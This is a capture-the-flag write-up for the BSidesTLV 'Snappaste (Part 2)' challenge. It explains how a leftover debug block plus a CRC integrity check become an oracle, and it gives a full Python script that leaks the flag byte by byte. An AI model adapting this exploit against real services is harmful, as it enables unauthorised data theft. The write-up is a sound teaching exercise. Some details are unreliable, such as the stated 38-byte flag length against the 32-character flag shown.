# Snappaste (Part 2) Writeup

Here's an improved version of our pasting service. Some weird stuff was happening in the previous version, so we added an integrity check for the pastes. Also, due to misuse, we began limiting the size of the pasted snippets (please don't paste Kali Linux ISOs, thanks).

URL: https://snappaste2.ctf.bsidestlv.com/

To compile, Use the following commands:

gcc -c -std=c99 zlib/*.c  
g++ -c -std=c++14 snappaste.cc   
g++ -o snappaste *.o -pthread  

By Michael Maltsev

## Solution

By using WinMerge we could observe the next major differences between the versions:

- `dword data_crc32;` added in `PASTE_NETWORK_HEADER`
- Size checking added:

```c
// Prevent service misuse
if (header->metadata_size > 0x10000 || header->data_compressed_size > 0x10000 || header->data_decompressed_size > 0x10000) {
  throw std::invalid_argument("data size too big :(");
}
```

- The next code was added:

```c
// TODO: remove after testing
if (true) {
  auto flag = readfile("./flag");
  if (paste_received->data_size >= flag.size()) {
    memcpy(paste_received->data, flag.c_str(), flag.size());
    if (backdoor) {
      backdoor = false;
      paste_received->metadata_size = 0;
      paste_received->data_size = static_cast<dword>(flag.size());
      return paste(paste_received);
    }
  }
}
```

- CRC validation.

This time we can't change `backdoor` variable because we don't have the previous integer overflow. Lets try to find new vulnerabilities with the added code.

Actually, this code:

```c
auto flag = readfile("./flag");
if (paste_received->data_size >= flag.size()) {
  memcpy(paste_received->data, flag.c_str(), flag.size());
```

Is giving us opportunity to leak the flag because it is being copied into the `paste_received->data_size` location, but it is being overwritten later with our data:

```python
uncompress(paste_received->data, &dest_len, data, header->data_compressed_size);
```

When we tried giving large `paste_received->data_size` value, but small actually compressed data (to see the rest of the flag), we are failing at the next CRC check:

```python
crc32(0, paste_received->data, paste_received->data_size);
```

Because we don't know the flag content, we can't really guess/bruteforce the CRC.

What we CAN do is to guess one letter at a time.

Lets first guess the flag length:

```python
guessed_length = 38

metadata = b'{"name": "alex","date":"2020-06-28T15:52:21.519Z"}'
metadata_size = len(metadata)
data_decompressed_size = guessed_length
data_decompressed = b'\x00'
data_compressed = zlib.compress(data_decompressed)
data_compressed_size = len(data_compressed)
data_crc32 = zlib.crc32(b'\x00'*guessed_length)

paste_data = b''
paste_data += struct.pack('<I', metadata_size)
paste_data += struct.pack('<I', data_compressed_size)
paste_data += struct.pack('<I', data_decompressed_size)
paste_data += struct.pack('<I', data_crc32)
paste_data += metadata
paste_data += data_compressed

r = requests.post(paste_url, data = paste_data, verify = False, headers = { 'Cookie': 'BSidesTLV=af6e736a35c13bfbe3f81d76e271a1aa52c3e937'})
r = requests.get(view_url + r.content.decode('ascii'), verify = False, headers = { 'Cookie': 'BSidesTLV=af6e736a35c13bfbe3f81d76e271a1aa52c3e937'})
print(r.content)
```

If the response is a successful one, the flag is bigger than `guessed_length`, if we get `integrity error :(` then flag is equal or small.

After a bit of guessing we calculated flag length is 38.

So how can we guess one letter at a time ?

If we give `data_decompressed_size` value of 38, we will pass the flag check, and the flag will be copied into the data buffer. Now, if we give actual data length of 37, we can bruteforce all possible last byte options (256 or less) untill the server returns successful response.

We can discover that way our whole flag.

Python Script:

```python
import requests
import struct
import zlib

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# url = 'http://127.0.0.1:8080/'
url = 'https://snappaste2.ctf.bsidestlv.com/'
paste_url = url + 'paste'
view_url = url + 'view/'
backdoor_url = url + 'backdoor/'

flag = [0] * 38
current_iteration = 1

for _ in range(38):
    for i in range(256): 
        print('.', end = '')
        metadata = b'{"name": "alex","date":"2020-06-28T15:52:21.519Z"}'
        metadata_size = len(metadata)
        data_decompressed_size = 38
        data_decompressed = b'\x00' * (data_decompressed_size - current_iteration)
        data_compressed = zlib.compress(data_decompressed)
        data_compressed_size = len(data_compressed)

        crc_candidate = data_decompressed + bytes([i]) + bytes(flag[38 - current_iteration + 1:])
        data_crc32 = zlib.crc32(crc_candidate)

        paste_data = b''
        paste_data += struct.pack('<I', metadata_size)
        paste_data += struct.pack('<I', data_compressed_size)
        paste_data += struct.pack('<I', data_decompressed_size)
        paste_data += struct.pack('<I', data_crc32)
        paste_data += metadata
        paste_data += data_compressed

        r = requests.post(paste_url, data = paste_data, verify = False, headers = { 'Cookie': 'BSidesTLV=af6e736a35c13bfbe3f81d76e271a1aa52c3e937'})
        if b'integrity' in r.content:
            continue

        r = requests.get(view_url + r.content.decode('ascii'), verify = False, headers = { 'Cookie': 'BSidesTLV=af6e736a35c13bfbe3f81d76e271a1aa52c3e937'})
        print(r.content)
        flag[38-current_iteration] = r.content[-current_iteration]
        current_iteration += 1
        break
```

Flag: `TLV2020{N3veR-Tru$t-us3R-iNput!}`
